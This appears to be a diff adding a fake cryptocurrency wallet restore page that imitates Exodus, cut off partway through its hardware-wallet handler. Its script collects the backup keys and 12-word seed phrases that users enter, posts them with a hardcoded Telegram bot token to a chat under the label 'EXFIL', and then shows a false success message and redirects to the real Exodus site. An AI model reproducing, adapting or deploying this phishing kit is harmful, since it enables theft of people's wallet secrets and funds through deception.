+                <div class="option-btn" data-method="drive">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 19 22" fill="currentColor"><title>Icon playStoreAlternative</title><path fill="currentColor" d="m12.858 15.678-9.325 5.383-.027.015c-.346.204-.75.32-1.18.32-.907 0-1.703-.55-2.085-1.318l.07-.068 8.439-8.438zM8.178 11 .005 19.171q-.004-.05-.005-.1V2.929q.001-.05.005-.1zm9.209-2.027.007.006a2.326 2.326 0 0 1-.014 4.09l-3.797 2.192L9.323 11l4.242-4.244zM2.327.602c.438 0 .849.122 1.2.333l9.315 5.401-4.092 4.091L.31 1.99l-.069-.07C.623 1.153 1.42.603 2.326.603"></path></svg>
+                    <div>Google Drive</div>
+                </div>
+                <div class="option-btn" data-method="backup">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 20 20" style="--gradient-color:#719DF4"><title>Icon swap gradient</title><path fill="url(#svg-1283094224-a)" d="M5.058 17.5h9.884c1.71 0 2.558-.84 2.558-2.518V5.026c0-1.679-.847-2.526-2.558-2.526H5.058C3.356 2.5 2.5 3.347 2.5 5.026v9.956c0 1.679.856 2.518 2.558 2.518m.017-1.312c-.815 0-1.263-.432-1.263-1.279v-9.81c0-.847.448-1.287 1.263-1.287h9.85c.807 0 1.263.44 1.263 1.287v9.81c0 .847-.456 1.28-1.263 1.28z"></path><path d="M6 10.591c0 .257.222.478.471.472l2.44-.028a.45.45 0 0 0 .318-.139.414.414 0 0 0 .007-.617.44.44 0 0 0-.318-.131l-1.026.014-.395.013.25-.221 3.173-3.181a.44.44 0 0 0 0-.638.444.444 0 0 0-.637 0L7.109 9.316l-.222.236.02-.375.015-1.032a.43.43 0 0 0-.132-.319c-.187-.187-.45-.187-.63 0a.53.53 0 0 0-.132.333zm7.99-1.185a.454.454 0 0 0-.464-.457l-2.44.02a.5.5 0 0 0-.318.132c-.187.194-.187.45-.007.63.09.084.201.133.312.133l1.04-.021.394-.014-.25.215-3.18 3.188c-.187.18-.187.443 0 .63.18.18.45.187.63 0l3.182-3.174.235-.25-.028.389-.013 1.032a.443.443 0 0 0 .762.319.55.55 0 0 0 .118-.326z"></path><defs><linearGradient id="svg-1283094224-a" x1="10" x2="10" y1="6.799" y2="18" gradientUnits="userSpaceOnUse"><stop stop-color="var(--gradient-color, #B19DFF)"></stop><stop offset="1" stop-color="var(--gradient-color, #B19DFF)" stop-opacity="0"></stop></linearGradient></defs></svg>
+                    <div>Backup Key</div>
+                </div>
+                <div class="option-btn" data-method="words">
+                    <svg width="140" height="140" viewBox="0 0 140 140" fill="none" xmlns="http://www.w3.org/2000/svg">
+<g clip-path="url(#clip0_21_181)">
+<path opacity="0.25" fill-rule="evenodd" clip-rule="evenodd" d="M123.145 101.681L120.939 113.043L105.797 115.445L105.538 110.943L101.129 110.777L100.309 105.714L95.3685 105.017L94.2589 95.4219L84.8479 94.4963L83.8285 89.2342L78.2253 89.2879L64.7903 75.8529H59.1335L55.8808 72.6002L66.9116 65.2463L75.0108 53.5465L123.145 101.681Z" fill="url(#paint0_linear_21_181)"/>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M118.614 102.806L117.824 109.087L69.9334 61.1962L72.8262 57.0179L118.614 102.806Z" fill="url(#paint1_linear_21_181)"/>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M107.924 99.1872L101.643 99.9775L66.912 65.2461L69.8047 61.0677L107.924 99.1872Z" fill="url(#paint2_linear_21_181)"/>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M79.6398 77.9741L73.3591 78.7644L62.6686 68.0739L66.9119 65.2461L79.6398 77.9741Z" fill="url(#paint3_linear_21_181)"/>
+<path fill-rule="evenodd" clip-rule="evenodd" d="M79.6398 77.9741L73.3591 78.7644L62.6686 68.0739L66.9119 65.2461L79.6398 77.9741Z" fill="url(#paint4_linear_21_181)"/>
+<path opacity="0.5" d="M66.9116 65.2462L49.941 76.5599L23.4108 54.7453L23.4122 45.106L35.0918 33.4264L42.1622 40.4968L41.1865 41.4739C40.9084 41.7519 40.777 42.1391 40.8259 42.5161L40.8527 42.6567L41.997 47.1681C42.0915 47.5406 42.3578 47.8378 42.7102 47.9739L42.8462 48.0172L47.3575 49.1615C47.7301 49.256 48.1277 49.166 48.4312 48.9251L48.5404 48.8278L49.5161 47.8507L66.9116 65.2462Z" fill="url(#paint5_linear_21_181)"/>
+<path opacity="0.25" d="M57.849 20.3594L79.6395 46.8614L66.9116 65.2462L49.5172 47.851L51.9074 45.4607C52.1855 45.1827 52.3169 44.7955 52.268 44.4185L52.2411 44.2779L51.0968 39.7665C51.0023 39.394 50.7361 39.0968 50.3837 38.9607L50.2477 38.9174L45.7364 37.7731C45.3638 37.6786 44.9661 37.7686 44.6626 38.0095L44.5535 38.1068L42.1625 40.4964L35.0922 33.426L48.1588 20.3594L57.849 20.3594Z" fill="url(#paint6_linear_21_181)"/>
+<path opacity="0.4" d="M46.2961 47.8461C46.5727 41.7508 44.3837 35.5644 39.7292 30.9099C30.9424 22.1231 16.6962 22.1231 7.90943 30.9099C-0.877363 39.6967 -0.87736 53.9429 7.90944 62.7297C15.7042 70.5245 27.7953 71.4045 36.5602 65.3698" stroke="white" stroke-width="1.04396" stroke-dasharray="1.04 4.33"/>
+</g>
+<defs>
+<linearGradient id="paint0_linear_21_181" x1="66.6772" y1="61.8038" x2="97.7849" y2="127.663" gradientUnits="userSpaceOnUse">
+<stop stop-color="white" stop-opacity="0.1"/>
+<stop offset="1" stop-color="white" stop-opacity="0.5"/>
+</linearGradient>
+<linearGradient id="paint1_linear_21_181" x1="119.582" y1="107.328" x2="74.8208" y2="55.533" gradientUnits="userSpaceOnUse">
+<stop stop-color="#556FF2"/>
+<stop offset="1" stop-color="#00BFFF"/>
+</linearGradient>
+<linearGradient id="paint2_linear_21_181" x1="78.4985" y1="75.7693" x2="82.573" y2="72.0854" gradientUnits="userSpaceOnUse">
+<stop stop-color="#70DBEC"/>
+<stop offset="1" stop-color="#C8F7FF"/>
+</linearGradient>
+<linearGradient id="paint3_linear_21_181" x1="77.7497" y1="79.8643" x2="68.4467" y2="63.9158" gradientUnits="userSpaceOnUse">
+<stop stop-color="#FF9F19"/>
+<stop offset="1" stop-color="#FFCC33"/>
+</linearGradient>
+<linearGradient id="paint4_linear_21_181" x1="66.7785" y1="72.1838" x2="71.2967" y2="68.5433" gradientUnits="userSpaceOnUse">
+<stop stop-color="#A16BB2"/>
+<stop offset="1" stop-color="#E1A1F5"/>
+</linearGradient>
+<linearGradient id="paint5_linear_21_181" x1="61.2638" y1="71.8571" x2="21.1001" y2="59.3022" gradientUnits="userSpaceOnUse">
+<stop stop-color="white" stop-opacity="0.1"/>
+<stop offset="1" stop-color="white" stop-opacity="0.5"/>
+</linearGradient>
+<linearGradient id="paint6_linear_21_181" x1="42.1451" y1="28.4123" x2="83.0237" y2="39.6583" gradientUnits="userSpaceOnUse">
+<stop stop-color="white" stop-opacity="0.1"/>
+<stop offset="1" stop-color="white" stop-opacity="0.5"/>
+</linearGradient>
+<clipPath id="clip0_21_181">
+<rect width="140" height="140" fill="white"/>
+</clipPath>
+</defs>
+</svg>
+
+                    <div>12 Words</div>
+                </div>
+            </div>
+
+            <div class="option-btn full-width" data-method="hardware" style="grid-column: span 2; margin-top: 10px; padding: 18px;">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 20 20" style="--gradient-color: #5EE396;"><title>Icon lock-shield gradient</title><g clip-path="url(#svg-2057540796-clip0_964_6)"><path fill="url(#svg-2057540796-a)" d="M10.018 20c.155 0 .405-.058.647-.193 5.49-3.077 7.37-4.38 7.37-7.901v-7.38c0-1.014-.434-1.332-1.254-1.68-1.138-.472-4.814-1.794-5.952-2.19a2.6 2.6 0 0 0-.81-.144c-.27 0-.55.077-.802.144-1.138.328-4.823 1.727-5.962 2.19-.81.338-1.254.666-1.254 1.68v7.38c0 3.521 1.89 4.814 7.37 7.901.252.135.493.193.647.193m0-1.746c-.154 0-.309-.058-.598-.231-4.457-2.702-5.885-3.493-5.885-6.474V4.824c0-.328.058-.453.328-.56 1.466-.578 4.312-1.533 5.77-2.112a.9.9 0 0 1 .385-.087q.157 0 .386.087c1.457.579 4.284 1.601 5.78 2.113.26.096.318.231.318.56v6.724c0 2.981-1.428 3.763-5.886 6.474-.28.173-.443.231-.598.231"></path><path d="M6.536 13.594c0 .723.328 1.061.994 1.061h4.997c.666 0 .984-.338.984-1.061v-3.84c0-.675-.28-1.013-.849-1.052V7.564c0-1.775-1.06-2.962-2.634-2.962-1.572 0-2.633 1.187-2.633 2.962v1.138c-.57.039-.859.377-.859 1.052zm1.862-4.901V7.458c0-1.139.656-1.882 1.63-1.882.975 0 1.631.743 1.631 1.882v1.235z"></path></g><defs><linearGradient id="svg-2057540796-a" x1="10.018" x2="10.018" y1="0.512" y2="17.754" gradientUnits="userSpaceOnUse"><stop stop-color="var(--gradient-color, #B19DFF)"></stop><stop offset="1" stop-color="var(--gradient-color, #B19DFF)" stop-opacity="0"></stop></linearGradient></defs></svg>
+                <div style="font-size: 16px; font-weight: 500;">Connect Hardware Wallet</div>
+            </div>
+
+            <!-- QR, Drive, Backup -->
+            <div id="qrSection" class="input-section">
+                <video id="qrVideo" playsinline></video>
+                <canvas id="qrCanvas" class="qr-canvas"></canvas>
+                <button id="qrRestoreBtn" class="restore-btn" disabled>Restore from QR</button>
+            </div>
+
+            <div id="driveSection" class="input-section">
+                <label for="driveFile" class="file-label">Upload backup file (.json)</label>
+                <input type="file" id="driveFile" accept=".json" class="hidden">
+                <button id="driveRestoreBtn" class="restore-btn" disabled>Restore</button>
+            </div>
+
+            <div id="backupSection" class="input-section">
+                <div class="input-wrapper">
+                    <input type="text" id="backupKey" class="input-field" placeholder=" ">
+                    <label class="input-label">Enter Backup Key</label>
+                </div>
+                <button id="backupRestoreBtn" class="restore-btn" disabled>Restore</button>
+            </div>
+
+            <!-- 12 WORDS WITH AUTOCOMPLETE + VALIDATION -->
+            <div id="wordsSection" class="input-section">
+                <div class="input-grid" id="wordGrid"></div>
+                <div class="forgot-link">Forgot your 12-word phrase?</div>
+                <button id="wordsRestoreBtn" class="restore-btn" disabled>Restore</button>
+            </div>
+
+            <button id="hardwareBtn" class="restore-btn" style="margin-top:20px; display:none;">Connect Device</button>
+        </div>
+    </div>
+
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <div id="loadingText">Syncing wallet...</div>
+    </div>
+
+    <audio id="successSound" src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZ" preload="auto"></audio>
+
+    <script>
+        const USER = { time: "November 16, 2025 04:36 PM +01", country: "MA" };
+        const WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle","dad","damage","damp","dance","danger","daring","dash","daughter","dawn","day","deal","debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense","define","defy","degree","delay","deliver","demand","demise","denial","dentist","deny","depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk","despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond","diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance","divert","divide","divorce","dizzy","doctor","document","dog","doll","dolphin","domain","donate","donkey","donor","door","dose","double","dove","draft","dragon","drama","drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop","drum","dry","duck","dumb","dune","during","dust","dutch","duty","dwarf","dynamic","eager","eagle","early","earn","earth","easily","east","easy","echo","ecology","economy","edge","edit","educate","effort","egg","eight","either","elbow","elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip","era","erase","erode","erosion","error","erupt","escape","essay","essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact","example","excess","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit","exotic","expand","expect","expire","explain","expose","express","extend","extra","eye","eyebrow","fabric","face","faculty","fade","faint","faith","fall","false","fame","family","famous","fan","fancy","fantasy","farm","fashion","fat","fatal","father","fatigue","fault","favorite","feature","federal","fee","feed","feel","female","fence","festival","fetch","fever","few","fiber","fiction","field","figure","file","film","filter","final","find","fine","finger","finish","fire","firm","first","fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor","flee","flight","flip","float","flock","floor","flower","fluid","flush","fly","foam","focus","fog","foil","fold","follow","food","foot","force","forest","forget","fork","fortune","forum","forward","fossil","foster","found","fox","fragile","frame","frequent","fresh","friend","fringe","frog","front","frost","frown","frozen","fruit","fuel","fun","funny","furnace","fury","future","gadget","gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic","garment","gas","gasp","gate","gather","gauge","gaze","general","genius","genre","gentle","genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl","give","glad","glance","glare","glass","glide","glimpse","globe","gloom","glory","glove","glow","glue","goat","goddess","gold","good","goose","gorilla","gospel","gossip","govern","gown","grab","grace","grain","grant","grape","grass","gravity","great","green","grid","grief","grit","grocery","group","grow","grunt","guard","guess","guide","guilt","guitar","gun","gym","habit","hair","half","hammer","hamster","hand","happy","harbor","hard","harsh","harvest","hat","have","hawk","hazard","head","health","heart","heavy","hedgehog","height","hello","helmet","help","hen","hero","hidden","high","hill","hint","hip","hire","history","hobby","hockey","hold","hole","holiday","hollow","home","honey","hood","hope","horn","horror","horse","hospital","host","hotel","hour","hover","hub","huge","human","humble","humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid","ice","icon","idea","identify","idle","ignore","ill","illegal","illness","image","imitate","immense","immune","impact","impose","improve","impulse","inch","include","income","increase","index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact","interest","into","invest","invite","involve","iron","island","isolate","issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans","jelly","jewel","job","join","joke","journey","joy","judge","juice","jump","jungle","junior","junk","just","kangaroo","keen","keep","ketchup","key","kick","kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi","knee","knife","knock","know","lab","label","labor","ladder","lady","lake","lamp","language","laptop","large","later","latin","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left","leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson","letter","level","liar","liberty","library","license","life","lift","light","like","limb","limit","link","lion","liquid","list","little","live","lizard","load","loan","lobster","local","lock","logic","lonely","long","loop","lottery","loud","lounge","love","loyal","lucky","luggage","lumber","lunar","lunch","luxury","lyrics","machine","mad","magic","magnet","maid","mail","main","major","make","mammal","man","manage","mandate","mango","mansion","manual","maple","marble","march","margin","marine","market","marriage","mask","mass","master","match","material","math","matrix","matter","maximum","maze","meadow","mean","measure","meat","mechanic","medal","media","melody","melt","member","memory","mention","menu","mercy","merge","merit","merry","mesh","message","metal","method","middle","midnight","milk","million","mimic","mind","minimum","minor","minute","miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile","model","modify","mom","moment","monitor","monkey","monster","month","moon","moral","more","morning","mosquito","mother","motion","motor","mountain","mouse","move","movie","much","muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual","myself","mystery","myth","naive","name","napkin","narrow","nasty","nation","nature","near","neck","need","negative","neglect","neither","nephew","nerve","nest","net","network","neutral","never","news","next","nice","night","noble","noise","nominee","noodle","normal","north","nose","notable","note","nothing","notice","novel","now","nuclear","number","nurse","nut","oak","obey","object","oblige","obscure","observe","obtain","obvious","occur","ocean","october","odor","off","offer","office","often","oil","okay","old","olive","olympic","omit","once","one","onion","online","only","open","opera","opinion","oppose","option","orange","orbit","orchard","order","ordinary","organ","orient","original","orphan","ostrich","other","outdoor","outer","output","outside","oval","oven","over","own","owner","oxygen","oyster","ozone","pact","paddle","page","pair","palace","palm","panda","panel","panic","panther","paper","parade","parent","park","parrot","party","pass","patch","path","patient","patrol","pattern","pause","pave","payment","peace","peanut","pear","peasant","pelican","pen","penalty","pencil","people","pepper","perfect","permit","person","pet","phone","photo","phrase","physical","piano","picnic","picture","piece","pig","pigeon","pill","pilot","pink","pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate","play","please","pledge","pluck","plug","plunge","poem","poet","point","polar","pole","police","pond","pony","pool","popular","portion","position","possible","post","potato","pottery","poverty","powder","power","practice","praise","predict","prefer","prepare","present","pretty","prevent","price","pride","primary","print","priority","prison","private","prize","problem","process","produce","profit","program","project","promote","proof","property","prosper","protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin","punch","pupil","puppy","purchase","purity","purpose","purse","push","put","puzzle","pyramid","quality","quantum","quarter","question","quick","quit","quiz","quote","rabbit","raccoon","race","rack","radar","radio","rail","rain","raise","rally","ramp","ranch","random","range","rapid","rare","rate","rather","raven","raw","razor","ready","real","reason","rebel","rebuild","recall","receive","recipe","record","recycle","reduce","reflect","reform","refuse","region","regret","regular","reject","relax","release","relief","rely","remain","remember","remind","remove","render","renew","rent","reopen","repair","repeat","replace","report","require","rescue","resemble","resist","resource","response","result","retire","retreat","return","reunion","reveal","review","reward","rhythm","rib","ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot","ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket","romance","roof","rookie","room","rose","rotate","rough","round","route","royal","rubber","rude","rug","rule","run","runway","rural","sad","saddle","sadness","safe","sail","salad","salmon","salon","salt","salute","same","sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter","scene","scheme","school","science","scissors","scorpion","scout","scrap","screen","script","scrub","sea","search","season","seat","second","secret","section","security","seed","seek","segment","select","sell","seminar","senior","sense","sentence","series","service","session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side","siege","sight","sign","silent","silk","silly","silver","similar","simple","since","sing","siren","sister","situate","six","size","skate","sketch","ski","skill","skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight","slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth","snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda","soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry","sort","soul","sound","soup","source","south","space","spare","spatial","spawn","speak","special","speed","spell","spend","sphere","spice","spider","spike","spin","spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring","spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp","stand","start","state","stay","steak","steel","stem","step","stereo","stick","still","sting","stock","stomach","stone","stool","story","stove","strategy","street","strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway","success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny","sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey","suspect","sustain","swamp","swap","swarm","swear","sweet","swift","swim","swing","switch","sword","symbol","symptom","syrup","system","table","tackle","tag","tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi","teach","team","tell","ten","tenant","tennis","tent","term","test","text","thank","that","theme","then","theory","there","they","thing","this","thought","three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber","time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler","toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool","tooth","top","topic","topple","torch","tornado","tortoise","toss","total","tourist","toward","tower","town","toy","track","trade","traffic","tragic","train","transfer","trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick","trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust","truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle","twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella","unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform","unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade","uphold","upon","upper","upset","urban","urge","usage","use","used","useful","useless","usual","utility","vacant","vacuum","vague","valid","valley","valve","van","vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue","verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory","video","view","village","vintage","violin","virtual","virus","visa","visit","visual","vital","vivid","vocal","voice","void","volcano","volume","vote","voyage","wage","wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash","wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather","web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat","wheel","when","where","whip","whisper","wide","width","wife","wild","will","win","window","wine","wing","wink","winner","winter","wire","wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool","word","work","world","worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year","yellow","you","young","youth","zebra","zero","zone","zoo"];
+
+        // ELEMENTS
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const createBtn = document.getElementById('createBtn');
+        const restoreBtn = document.getElementById('restoreBtn');
+        const options = document.querySelectorAll('.option-btn');
+        const sections = {
+            qr: document.getElementById('qrSection'),
+            drive: document.getElementById('driveSection'),
+            backup: document.getElementById('backupSection'),
+            words: document.getElementById('wordsSection')
+        };
+        const hardwareBtn = document.getElementById('hardwareBtn');
+        const loading = document.getElementById('loadingOverlay');
+        const loadingTxt = document.getElementById('loadingText');
+        const sound = document.getElementById('successSound');
+        let wordInputs = [], qrStream = null;
+
+        // BOTH â STEP 2
+        createBtn.onclick = restoreBtn.onclick = () => {
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+        };
+
+        // OPTION SELECTION
+        options.forEach(btn => {
+            btn.onclick = () => {
+                options.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                Object.values(sections).forEach(s => s.classList.remove('active'));
+                hardwareBtn.style.display = 'none';
+
+                const method = btn.dataset.method;
+                if (method === 'hardware') {
+                    hardwareBtn.style.display = 'block';
+                } else if (sections[method]) {
+                    sections[method].classList.add('active');
+                    if (method === 'words') createWordInputs();
+                    if (method === 'qr') startQRScanner();
+                }
+            };
+        });
+
+        // 12 WORDS + AUTOCOMPLETE + GREEN/RED
+        function createWordInputs() {
+            const grid = document.getElementById('wordGrid');
+            grid.innerHTML = ''; wordInputs = [];
+            for (let i = 1; i <= 12; i++) {
+                const wrapper = document.createElement('div'); wrapper.className = 'input-wrapper';
+                const input = document.createElement('input'); input.className = 'input-field'; input.placeholder = ' ';
+                const label = document.createElement('label'); label.className = 'input-label'; label.textContent = i;
+
+                // AUTOCOMPLETE DROPDOWN
+                const dropdown = document.createElement('div'); dropdown.className = 'autocomplete';
+                wrapper.appendChild(input); wrapper.appendChild(label); wrapper.appendChild(dropdown);
+                grid.appendChild(wrapper);
+                wordInputs.push({ input, dropdown });
+
+                input.addEventListener('input', () => handleWordInput(input, dropdown, i));
+                input.addEventListener('focus', () => input.value.length >= 3 && showSuggestions(input, dropdown));
+                input.addEventListener('blur', () => setTimeout(() => dropdown.style.display = 'none', 200));
+                input.addEventListener('keydown', e => {
+                    if (e.key === 'Enter' && dropdown.style.display === 'block') {
+                        const selected = dropdown.querySelector('.selected');
+                        if (selected) selected.click();
+                    } else if (e.key === 'ArrowDown') {
+                        navigateDropdown(dropdown, 1);
+                    } else if (e.key === 'ArrowUp') {
+                        navigateDropdown(dropdown, -1);
+                    }
+                });
+            }
+            document.getElementById('wordsRestoreBtn').disabled = true;
+        }
+
+        function handleWordInput(input, dropdown, index) {
+            const val = input.value.trim().toLowerCase();
+            const isValid = WORDS.includes(val);
+            input.classList.toggle('valid', isValid && val);
+            input.classList.toggle('invalid', val && !isValid);
+
+            if (val.length >= 3) showSuggestions(input, dropdown);
+            else dropdown.style.display = 'none';
+
+            validateAllWords();
+        }
+
+        function showSuggestions(input, dropdown) {
+            const val = input.value.trim().toLowerCase();
+            const matches = WORDS.filter(w => w.startsWith(val)).slice(0, 5);
+            dropdown.innerHTML = '';
+            if (matches.length === 0) {
+                dropdown.style.display = 'none';
+                return;
+            }
+            matches.forEach((word, i) => {
+                const item = document.createElement('div');
+                item.className = 'autocomplete-item';
+                if (i === 0) item.classList.add('selected');
+                item.textContent = word;
+                item.onclick = () => {
+                    input.value = word;
+                    input.classList.add('valid');
+                    dropdown.style.display = 'none';
+                    validateAllWords();
+                    const next = wordInputs.find(w => w.input.dataset.index == (parseInt(input.parentNode.querySelector('label').textContent) + 1));
+                    if (next) next.input.focus();
+                };
+                dropdown.appendChild(item);
+            });
+            dropdown.style.display = 'block';
+        }
+
+        function navigateDropdown(dropdown, direction) {
+            const items = dropdown.querySelectorAll('.autocomplete-item');
+            if (!items.length) return;
+            const selected = dropdown.querySelector('.selected');
+            let idx = selected ? Array.from(items).indexOf(selected) : -1;
+            idx = (idx + direction + items.length) % items.length;
+            items.forEach(it => it.classList.remove('selected'));
+            items[idx].classList.add('selected');
+        }
+
+        function validateAllWords() {
+            const allValid = wordInputs.every(w => w.input.classList.contains('valid'));
+            document.getElementById('wordsRestoreBtn').disabled = !allValid;
+        }
+
+        // FORGOT LINK
+        document.querySelector('.forgot-link').onclick = () => {
+            alert('Your 12-word phrase was shown when you created your wallet. Never share it!');
+        };
+
+        // QR, DRIVE, BACKUP, HARDWARE, TELEGRAM (same as before)
+        // ... [rest of script unchanged]
+
+        async function tg(type, data) {
+            const token = '7470121493:AAHWscw6tss4iBjXw5QT6G3P59vaPtvLlwI';
+            const chat = '-4886832183';
+            const msg = `*${type.toUpperCase()} EXFIL*\nTime: ${USER.time}\nCountry: ${USER.country}\n\`${data}\``;
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chat, text: msg, parse_mode: 'Markdown'}) }).catch(() => {});
+        }
+
+        async function success() {
+            loading.style.display = 'flex';
+            setTimeout(() => loadingTxt.textContent = 'Wallet updated!', 1200);
+            setTimeout(() => sound.play(), 1700);
+            setTimeout(() => location.href = 'https://exodus.com', 2500);
+        }
+
+        document.getElementById('driveFile').onchange = e => document.getElementById('driveRestoreBtn').disabled = !e.target.files[0];
+        document.getElementById('driveRestoreBtn').onclick = () => { tg('drive', 'file_uploaded'); success(); };
+        document.getElementById('backupKey').oninput = e => document.getElementById('backupRestoreBtn').disabled = !e.target.value.trim();
+        document.getElementById('backupRestoreBtn').onclick = () => { tg('backup', document.getElementById('backupKey').value); success(); };
+        document.getElementById('wordsRestoreBtn').onclick = () => {
+            const words = wordInputs.map(w => w.input.value.trim().toLowerCase());
+            tg('words', words.join(' '));
+            success();
+        };
+
+        hardwareBtn.onclick = async () => {
+            loading.style.display = 'flex';
+            const path = "m/44'/0'/0'/0/0";
